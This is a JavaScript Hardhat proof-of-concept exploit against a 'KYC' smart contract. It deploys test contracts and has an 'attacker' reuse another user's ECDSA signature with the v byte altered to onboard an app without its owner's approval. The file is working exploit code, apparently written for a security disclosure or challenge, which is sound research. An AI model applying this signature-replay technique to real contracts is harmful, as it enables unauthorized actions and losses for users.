const { expect } = require("chai");
const { ethers } = require("hardhat");

async function deploy(deployer, user1, user2) {
    const KYC = await ethers.getContractFactory("KYC", deployer);
    const KYCApp1 = await ethers.getContractFactory("KYCApp", user1);
    const KYCApp2 = await ethers.getContractFactory("KYCApp", user2);

    const kyc = await KYC.deploy();
    const app1 = await KYCApp1.deploy();
    const app2 = await KYCApp2.deploy();
    return [kyc, app1, app2];
}

async function main() {
    let [deployer, user1, user2, attacker] = await ethers.getSigners();
    let [kyc, app1, app2] = await deploy(deployer, user1, user2);

    await kyc.connect(user1).applyFor(app1.address);

    let user1SomeHash = "0x0123456789012345678901234567890123456789012345678901234567890123";
    let user1SomeDescr = "I'm signing the message!";

    let payload = await ethers.utils.defaultAbiCoder.encode(["bytes32", "string"], [user1SomeHash, user1SomeDescr]);
    let payloadHash = await ethers.utils.keccak256(payload);

    let user1Signature = await user1.signMessage(ethers.utils.arrayify(payloadHash));
    let splittedSig = ethers.utils.splitSignature(user1Signature);
    await expect(await ethers.utils.verifyMessage(ethers.utils.arrayify(payloadHash), splittedSig)).to.equal(
        user1.address
    );

    await kyc.connect(user1).onboardWithSig(app1.address, user1SomeHash, user1SomeDescr, user1Signature);
    await expect(await kyc.onboardedApps(app1.address)).to.equal(true);

    console.log("\nExploit POC : \n");

    console.log("User 1 signature was: ")
    console.log(user1Signature);
    modifiedUser1Signature = user1Signature.slice(0, -2) + "ff";
    console.log("The Attacker reuses User 1 signature, except the last 2 bytes must be different than 0x1b (v=27) and 0x1c (v=28).");
    console.log(modifiedUser1Signature);

    await kyc.connect(attacker).onboardWithSig(app2.address, user1SomeHash, user1SomeDescr, modifiedUser1Signature);
    await expect(await kyc.onboardedApps(app2.address)).to.equal(true);
    console.log("Attack successful: the Attacker onboarded App2 without its owner's approval.")
}

main();
